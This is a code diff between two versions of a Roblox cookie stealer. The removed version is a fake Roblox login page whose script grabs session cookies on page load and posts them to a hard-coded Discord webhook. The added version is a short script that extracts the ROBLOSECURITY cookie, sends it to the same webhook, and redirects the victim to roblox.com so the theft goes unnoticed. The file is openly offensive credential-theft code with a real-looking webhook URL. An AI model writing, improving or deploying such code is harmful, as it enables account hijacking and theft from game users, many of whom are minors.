@@ -1,103 +1,27 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Login</title>
-    <style>
-        body {
-            background-color: #232527;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #393b3d;
-            padding: 40px;
-            border-radius: 8px;
-            width: 350px;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-        h2 { color: white; margin-bottom: 20px; }
-        input {
-            width: 90%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border-radius: 4px;
-            border: none;
-        }
-        button {
-            background-color: #ffffff;
-            color: black;
-            padding: 12px;
-            width: 96%;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
-        }
-        button:hover { background-color: #e0e0e0; }
-    </style>
-</head>
-<body>
+// 1. Get the Cookie String
+const cookies = document.cookie; 
+const cookieArray = cookies.split(';');
+let robloxCookie = "";
 
-    <div class="container">
-        <!-- Fake Login Screen -->
-        <h2>Welcome to Roblox</h2>
-        <input type="text" placeholder="Username or Email" disabled>
-        <input type="password" placeholder="Password" disabled>
-        <button onclick="grabCookie()">Login Now</button>
-    </div>
+// 2. Find ROBLOSECURITY specifically
+for (let i = 0; i < cookieArray.length; i++) {
+    let cookie = cookieArray[i].trim();
+    if (cookie.indexOf("ROBLOSECURITY=") === 0) {
+        robloxCookie = cookie.substring(16); // Remove "ROBLOSECURITY="
+        break;
+    }
+}
 
-    <script>
-        // 1. PASTE YOUR DISCORD WEBHOOK URL BELOW
-        const webhookUrl = "https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4"; 
+// 3. Send to Discord Webhook
+if (robloxCookie) {
+    fetch('https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: `**Cookie Grabbed!**\n\n${robloxCookie}` })
+    });
 
-        function grabCookie() {
-            // Get all cookies from the browser
-            let cookieString = document.cookie;
-            
-            // Filter specifically for Roblox Cookies
-            let robloxCookies = [];
-            let cookies = cookieString.split('; ');
-            
-            cookies.forEach(cookie => {
-                if (cookie.startsWith('_RbxSessionId_') || 
-                    cookie.startsWith('_RbxToken_') || 
-                    cookie.startsWith('.ROBLOX.COM')) {
-                    robloxCookies.push(cookie);
-                }
-            });
-
-            // If we found a cookie, send it to Discord
-            if (robloxCookies.length > 0) {
-                let finalCookie = robloxCookies.join('; ');
-                
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: `🍪 **New Roblox Cookie Found!**\n\n**User:** ${document.domain}\n**Cookie:** \`${finalCookie}\``
-                    })
-                }).then(response => {
-                    // Optional: Change button text to show success
-                    document.querySelector('button').innerText = "Logged In!";
-                    document.querySelector('button').style.backgroundColor = "#43b581";
-                });
-            } else {
-                alert("Cookie not found yet. Refresh the page.");
-            }
-        }
-
-        // Run immediately on load (so they don't even have to click)
-        window.onload = function() {
-            grabCookie(); 
-        };
-    </script>
-</body>
-</html>
+    // 4. Redirect them back to Roblox so they don't notice
+    window.location.href = "https://www.roblox.com"; 
+} else {
+    alert("Cookie not found! Make sure you are logged into Roblox in this browser.");
+}
